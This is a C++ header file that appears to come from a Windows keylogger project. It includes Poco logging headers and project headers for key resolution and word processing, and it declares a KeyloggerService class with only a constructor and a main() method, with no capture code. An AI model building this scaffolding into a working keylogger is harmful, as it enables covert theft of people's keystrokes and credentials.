#pragma once
#include <windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Path.h"
#include "Poco/FileStream.h"
#include "Poco/DateTimeFormatter.h"
#include <Poco/Util/PropertyFileConfiguration.h>
#include <Poco/FileChannel.h>
#include <Poco/PatternFormatter.h>
#include <Poco/FormattingChannel.h>
#include "KeyResolver.h"
#include "NullGuardProcessor.h"
#include "WordProcessor.h"
#include "WorkerThread.h"


using namespace Poco;
using Poco::Util::HelpFormatter;
using Poco::Path;
using Poco::FileOutputStream;
using Poco::DateTimeFormatter;

class KeyloggerService
{
public:
    KeyloggerService();
    int main();
private:

    std::string appName;
};